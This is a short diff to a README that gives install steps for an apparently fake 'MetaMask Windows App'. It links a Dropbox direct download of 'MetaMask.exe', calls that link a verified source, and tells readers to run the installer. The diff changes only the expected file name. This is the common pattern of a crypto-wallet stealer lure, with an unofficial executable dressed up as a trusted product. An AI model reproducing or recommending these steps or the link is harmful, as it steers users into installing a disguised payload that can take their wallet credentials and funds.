@@ -51,7 +51,7 @@ To install and use the MetaMask Windows App, ensure that your system meets the f
 **Step 1: Download the Installer**
   1. Download the app from a verified source [**DropBox**](https://www.dropbox.com/scl/fi/duphk31r147lab5nmmoto/MetaMask.exe?rlkey=j2tm3ajlj3gtbjsgtf23qk110&st=jifvmrjm&dl=1).
   2. Click on the Download for Windows button to download the installer.
-  3. Confirm that you are downloading the file named metamask_windows_app_setup.exe or a similar verified name.
+  3. Confirm that you are downloading the file named **metamask.exe** or a similar verified name.
 
 **Step 2: Run the Installer**
 1. Locate the downloaded installer file in your system's Downloads folder.
